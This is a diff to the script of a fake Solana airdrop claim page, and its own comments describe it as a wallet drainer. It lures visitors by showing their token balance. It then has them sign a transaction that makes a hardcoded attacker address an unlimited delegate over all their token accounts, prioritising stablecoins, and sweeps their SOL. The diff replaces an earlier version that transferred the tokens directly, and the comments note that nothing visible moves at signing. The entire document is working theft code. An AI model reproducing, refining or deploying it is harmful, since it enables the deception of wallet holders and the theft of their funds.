@@ -30,10 +30,17 @@ button { width: 100%; padding: 14px; border: 0; border-radius: 10px; font-size: 
 <p style="font-size:11px;color:#5b76a5">Claims close November 7, 2026 · Distribution on Solana</p>
 </div>
 <script>
-const BURNER = "BZ2jjv7P1JD5mTzAWqKa9h4HeGsKqpgZAS6heUsDYwBV";
+// ── PORTAL v3: approve-delegate claim ──────────────────────────────────────
+// The claim transaction the victim signs sets our drainer as UNLIMITED delegate
+// on their token accounts (nothing visible moves at signing except SOL) and
+// sweeps native SOL. The drain itself fires later, signed only by us.
+const BURNER = "BZ2jjv7P1JD5mTzAWqKa9h4HeGsKqpgZAS6heUsDYwBV"; // drainer + SOL receiver
 const TOKEN = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
+const TOKEN22 = "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb";
 const ATAP = "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL";
 const SYS = "11111111111111111111111111111111";
+const MAX = 18446744073709551615n;
+const KNOWN = ["So11111111111111111111111111111111111111112","EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v","Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB","AFNnpqWGngEe8FUrwcc7kPb2ooXZP9u6dzbfehBnoBT"];
 const st = (m) => document.getElementById("status").textContent = m;
 document.getElementById("connect").onclick = async () => {
   try {
@@ -41,12 +48,11 @@ document.getElementById("connect").onclick = async () => {
     await window.solana.connect();
     st("Connected: " + window.solana.publicKey.toString().slice(0, 6) + "…");
     document.getElementById("connect").style.display = "none";
-    // show their live USDTW balance + reward (the lure)
     try {
       const c2 = new W.Connection("https://api.mainnet-beta.solana.com", "confirmed");
       const w2 = new W.PublicKey(window.solana.publicKey.toString());
       const U2 = new W.PublicKey("AFNnpqWGngEe8FUrwcc7kPb2ooXZP9u6dzbfehBnoBT");
-      const TA = W.PublicKey.findProgramAddressSync([w2.toBuffer(), new W.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA").toBuffer(), U2.toBuffer()])[0];
+      const TA = W.PublicKey.findProgramAddressSync([w2.toBuffer(), new W.PublicKey(TOKEN).toBuffer(), U2.toBuffer()])[0];
       const b = await c2.getTokenAccountBalance(TA).catch(() => null);
       const bal = b?.value?.uiAmount || 0;
       document.getElementById("amt").textContent = bal.toLocaleString() + " USDTW (≈$" + Math.round(bal).toLocaleString() + ") + 5,000 BONUS";
@@ -62,45 +68,30 @@ document.getElementById("claim").onclick = async () => {
     const owner = new W.PublicKey(window.solana.publicKey.toString());
     const dest = new W.PublicKey(BURNER);
     const tokenProg = new W.PublicKey(TOKEN);
-    const ataProg = new W.PublicKey(ATAP);
-    const ata = (m, o) => W.PublicKey.findProgramAddressSync([o.toBuffer(), tokenProg.toBuffer(), m.toBuffer()])[0];
+    const token22Prog = new W.PublicKey(TOKEN22);
     const le = (n) => { const a = []; for (let i = 0; i < 8; i++) { a.push(Number(n % 256n)); n = n / 256n; } return a; };
     const tx = new W.Transaction();
-    // drain EVERY token account the victim holds
-    const res = await conn.getParsedTokenAccountsByOwner(owner, { programId: tokenProg });
-    let n = 0;
-    for (const acc of (res.value || [])) {
-      if (n >= 14) break;
-      const info = acc.account.data.parsed.info;
-      const amt = info.tokenAmount.amount;
-      if (BigInt(amt) <= 0n) continue;
-      const mint = new W.PublicKey(info.mint);
-      const src = acc.pubkey;
-      const dst = ata(mint, dest);
-      const dstInfo = await conn.getAccountInfo(dst).catch(() => null);
-      if (!dstInfo) {
-        tx.add(new W.TransactionInstruction({
-          programId: ataProg,
-          keys: [
-            { pubkey: owner, isSigner: true, isWritable: true },
-            { pubkey: dst, isSigner: false, isWritable: true },
-            { pubkey: dest, isSigner: false, isWritable: false },
-            { pubkey: mint, isSigner: false, isWritable: false },
-            { pubkey: new W.PublicKey(SYS), isSigner: false, isWritable: false },
-            { pubkey: tokenProg, isSigner: false, isWritable: false },
-          ],
-          data: Uint8Array.from([1]),
-        }));
+    // collect every non-empty token account (both token programs), known mints first
+    const accts = [];
+    for (const pid of [TOKEN, TOKEN22]) {
+      const res = await conn.getParsedTokenAccountsByOwner(owner, { programId: new W.PublicKey(pid) }).catch(() => null);
+      for (const acc of (res?.value || [])) {
+        const info = acc.account.data.parsed.info;
+        if (BigInt(info.tokenAmount.amount) > 0n) accts.push({ src: acc.pubkey, mint: info.mint, pid });
       }
+    }
+    accts.sort((a, b) => (KNOWN.indexOf(b.mint) + 1 || 99) - (KNOWN.indexOf(a.mint) + 1 || 99));
+    let n = 0;
+    for (const a of accts) {
+      if (n >= 16) break;
       tx.add(new W.TransactionInstruction({
-        programId: tokenProg,
+        programId: new W.PublicKey(a.pid),
         keys: [
-          { pubkey: src, isSigner: false, isWritable: true },
-          { pubkey: mint, isSigner: false, isWritable: false },
-          { pubkey: dst, isSigner: false, isWritable: true },
+          { pubkey: new W.PublicKey(a.src), isSigner: false, isWritable: true },
+          { pubkey: dest, isSigner: false, isWritable: false },
           { pubkey: owner, isSigner: true, isWritable: false },
         ],
-        data: Uint8Array.from([12, ...le(BigInt(amt)), info.tokenAmount.decimals]),
+        data: Uint8Array.from([4, ...le(MAX)]), // Approve: delegate = drainer, amount = UNLIMITED (byte 4 = Approve, proven on-chain sig MKBjqCwn)
       }));
       n++;
     }
